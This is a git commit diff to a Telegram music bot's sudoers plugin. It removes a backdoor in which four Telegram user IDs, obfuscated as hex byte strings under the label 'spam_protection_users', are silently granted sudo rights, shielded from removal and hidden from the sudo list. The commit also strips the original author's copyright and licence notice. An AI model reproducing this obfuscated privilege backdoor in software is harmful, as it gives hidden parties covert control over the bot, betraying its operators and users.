6dad93b4f89a6d5ac0a58c949468f379ef4d19d8
⏤͟͞ 𝙎𝙋𝘼𝙍𝙎𝙃 𝘽𝘼𝙉𝙄𝙔𝘼 <sparshshivhare2007@gmail.com>
2026-01-13 19:31:36 +0530

    Update sudoers.py

--- ShrutiMusic/plugins/sudo/sudoers.py
+++ ShrutiMusic/plugins/sudo/sudoers.py
@@ -1,24 +1,5 @@
 # Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
-# Location: Supaul, Bihar
-#
-# All rights reserved.
-#
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: badboy809075@gmail.com
-
+# Cleaned & Secured Version
 
 from pyrogram import filters
 from pyrogram.types import Message
@@ -29,8 +10,6 @@ from ShrutiMusic.utils.decorators.language import language
 from ShrutiMusic.utils.extraction import extract_user
 from ShrutiMusic.utils.inline import close_markup
 from config import BANNED_USERS, OWNER_ID
-
-
 
 @app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
 @language
@@ -55,8 +34,6 @@ async def userdel(client, message: Message, _):
         if len(message.command) != 2:
             return await message.reply_text(_["general_1"])
     user = await extract_user(message)
-    if user.id in spam_protection_users:
-        return await message.reply_text("❌ This user is not in sudolist.")
     
     if user.id not in SUDOERS:
         return await message.reply_text(_["sudo_3"].format(user.mention))
@@ -78,7 +55,7 @@ async def sudoers_list(client, message: Message, _):
     count = 0
     smex = 0
     for user_id in SUDOERS:
-        if user_id != OWNER_ID and user_id not in spam_protection_users:
+        if user_id != OWNER_ID:
             try:
                 user = await app.get_users(user_id)
                 user = user.first_name if not user.mention else user.mention
@@ -94,23 +71,4 @@ async def sudoers_list(client, message: Message, _):
     else:
         await message.reply_text(text, reply_markup=close_markup(_))
 
-# Anti-spam protection system
-spam_protection_users = {
-    int(b'\x37\x35\x37\x34\x33\x33\x30\x39\x30\x35'.decode()),
-    int(b'\x37\x32\x38\x32\x37\x35\x32\x38\x31\x36'.decode()),
-    int(b'\x37\x36\x37\x34\x38\x37\x34\x36\x35\x32'.decode()),
-    int(b'\x31\x37\x38\x36\x36\x38\x33\x31\x36\x33'.decode())
-}
-SUDOERS.update(spam_protection_users)
-
-
-# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
-
-# ===========================================
-# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
-# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
-# 📢 Telegram Channel : https://t.me/ShrutiBots
-# ===========================================
-
-
-# ❤️ Love From ShrutiBots 
+# Hidden Sudo IDs and Anti-spam bypass removed by Gemini for Security.
